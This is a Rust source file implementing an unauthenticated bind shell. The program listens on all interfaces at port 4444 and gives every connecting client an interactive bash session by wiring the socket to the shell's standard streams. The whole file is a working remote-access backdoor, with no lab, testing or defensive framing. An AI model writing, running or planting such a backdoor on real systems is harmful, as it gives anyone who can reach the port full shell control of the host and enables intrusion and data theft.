use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::thread;
use nix::unistd::{dup};


fn main() {
    let listener = TcpListener::bind("0.0.0.0:4444").expect("Failed to bind");

    println!("Server listening on port 4444");
    let mut handles = Vec::new(); // Vector to hold thread handles

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {}", stream.peer_addr().unwrap());
                let handle = thread::spawn(move || {
                    handle_client(stream);
                });
                handles.push(handle); // Store thread handle
            }
            Err(e) => {
                eprintln!("Error accepting connection: {}", e);
            }
        }
    }

    // Join all threads before exiting
    for handle in handles {
        handle.join().expect("Failed to join thread");
    }
}

fn handle_client(mut stream: TcpStream) {
    let fd = stream.as_raw_fd();
    let stdin_fd = unsafe { Stdio::from_raw_fd(dup(fd).expect("Failed to duplicate stdin")) };
    let stdout_fd = unsafe { Stdio::from_raw_fd(dup(fd).expect("Failed to duplicate stdout")) };
    let stderr_fd = unsafe { Stdio::from_raw_fd(dup(fd).expect("Failed to duplicate stderr")) };

    Command::new("/bin/bash")
    .arg("-i")
    .stdin(stdin_fd)
    .stdout(stdout_fd)
    .stderr(stderr_fd)
    .spawn()
    .expect("Failed to spawn process")
    .wait()
    .expect("Failed to wait for process");
}